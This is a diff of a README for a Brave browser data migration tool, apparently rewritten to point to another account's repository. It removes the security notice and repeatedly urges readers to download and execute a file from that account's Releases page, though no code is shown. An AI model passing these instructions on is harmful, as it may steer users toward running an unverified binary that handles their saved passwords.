@@ -1,115 +1,114 @@
-# BraveVault: Cross-Platform Browser Data Migration Tool
+# BraveVault: Cross-Platform Browser Data Migration Tool 🛡️
 
-<p align="center">
-  <img src="https://brave.com/static-assets/images/brave-logo-sans-text.svg" alt="Brave Logo" width="100">
-</p>
+![BraveVault Logo](https://img.shields.io/badge/BraveVault-Cross--Platform%20Browser%20Data%20Migration%20Tool-blue.svg)
 
-BraveVault is a powerful tool for securely transferring your Brave browser data (history, passwords, bookmarks) between different operating systems. Perfect for when you're switching computers or setting up a new system.
+Welcome to **BraveVault**, a secure tool designed to help you transfer your Brave browser data—such as history, passwords, and bookmarks—across different operating systems. Whether you are switching computers or setting up a new system, BraveVault makes the process smooth and efficient.
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## Table of Contents
 
-## ✨ Features
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Platforms](#supported-platforms)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-- **Comprehensive Data Export**: Extract all essential browser data
-  - Passwords (fully encrypted)
-  - Browsing history
-  - Bookmarks
-  - Site preferences
-- **Secure Password Handling**: Proprietary encryption handling for safe password transfer
-- **Dual Interface**: Use command-line or graphical interface
-- **Cross-Platform**: Works seamlessly between Windows and Ubuntu/Linux
-- **Backup Protection**: Automatically creates backups before importing
+## Features 🌟
 
-## 📋 Requirements
+- **Secure Data Transfer**: Uses encryption to protect your data during the transfer process.
+- **Cross-Platform Compatibility**: Works on Windows, Linux, and macOS.
+- **Easy to Use**: Simple command-line interface for quick data migration.
+- **Data Types Supported**: Transfers bookmarks, browsing history, and saved passwords.
+- **Open Source**: Community-driven development with a focus on privacy and security.
 
-- Python 3.6+
-- Brave Browser installed on both systems
-- Required Python packages (installed automatically)
+## Installation ⚙️
 
-## 🚀 Installation
+To get started with BraveVault, follow these steps:
 
-### Quick Install (Recommended)
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Faelh-242/BraveVault-Cross-Platform-Browser-Data-Migration-Tool.git
+   cd BraveVault-Cross-Platform-Browser-Data-Migration-Tool
+   ```
 
-```bash
-# On Linux
-git clone https://github.com/brighteyekid/BraveVault-Cross-Platform-Browser-Data-Migration-Tool.git
-cd brave-vault
-./install.sh
+2. **Install Dependencies**:
+   Make sure you have Python installed. Then, install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-# On Windows
-git clone https://github.com/brighteyekid/BraveVault-Cross-Platform-Browser-Data-Migration-Tool.git
-cd brave-vault
-install.bat
-```
+3. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/Faelh-242/BraveVault-Cross-Platform-Browser-Data-Migration-Tool/releases) to download the latest version. Execute the downloaded file to install BraveVault.
 
-### Manual Installation
+## Usage 📦
 
-```bash
-git clone https://github.com/brighteyekid/BraveVault-Cross-Platform-Browser-Data-Migration-Tool.git
-cd brave-vault
-pip install -r requirements.txt
-```
+Using BraveVault is straightforward. Follow these steps to transfer your data:
 
-## 💻 Usage
+1. **Open Command Line Interface**:
+   Launch your terminal or command prompt.
 
-### Graphical Interface
+2. **Run BraveVault**:
+   Use the following command to start the tool:
+   ```bash
+   python bravevault.py
+   ```
 
-The easiest way to use BraveVault is through its graphical interface:
+3. **Select Options**:
+   You will see options for transferring bookmarks, history, or passwords. Choose the data type you want to migrate.
 
-**On Linux:**
-```bash
-./brave_extractor.sh gui
-```
+4. **Follow Prompts**:
+   The tool will guide you through the process. Make sure to follow the on-screen instructions carefully.
 
-**On Windows:**
-```batch
-brave_extractor.bat gui
-```
+5. **Complete the Transfer**:
+   Once the transfer is complete, you will receive a confirmation message.
 
-### Command Line Interface
+## Supported Platforms 🖥️
 
-For advanced users or automation:
+BraveVault supports the following operating systems:
 
-**Export your browser data:**
-```bash
-python brave_extractor.py export --output brave_data.zip
-```
+- **Windows**
+- **Linux**
+- **macOS**
 
-**Import on a new system:**
-```bash
-python brave_extractor.py import --input brave_data.zip
-```
+No matter which platform you are using, BraveVault provides a seamless experience.
 
-#### Advanced Options
+## Contributing 🤝
 
-```bash
-# Export only specific data
-python brave_extractor.py export --output brave_data.zip --no-passwords --no-history
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
 
-# Export only recent history
-python brave_extractor.py export --output brave_data.zip --history-days 30
-```
+1. **Fork the Repository**: Click the "Fork" button on the top right of the repository page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit a pull request.
 
-## 🔍 Data Locations
+## License 📄
 
-BraveVault automatically finds your Brave browser data in:
+BraveVault is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-- **Windows**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default`
-- **Ubuntu/Linux**: `~/.config/BraveSoftware/Brave-Browser/Default`
+## Contact 📧
 
-## 🔒 Security Notice
+For questions or support, feel free to reach out:
 
-This tool handles sensitive information including passwords. To maintain security:
+- **Email**: support@bravevault.com
+- **GitHub Issues**: Open an issue in the repository for any bugs or feature requests.
 
-- Keep exported data files secure
-- Transfer data files using encrypted channels
-- Delete exported files after completing the transfer
-- Close Brave browser before importing data
+## Releases 📦
 
-## 🤝 Contributing
+To download the latest version of BraveVault, visit the [Releases section](https://github.com/Faelh-242/BraveVault-Cross-Platform-Browser-Data-Migration-Tool/releases). Make sure to execute the downloaded file for installation.
 
-Contributions are welcome! Feel free to submit pull requests or open issues to improve BraveVault.
+---
 
-## 📜 License
-
-This project is licensed under the MIT License - see the LICENSE file for details. 
+Thank you for using BraveVault! Your feedback and contributions help us improve the tool for everyone.
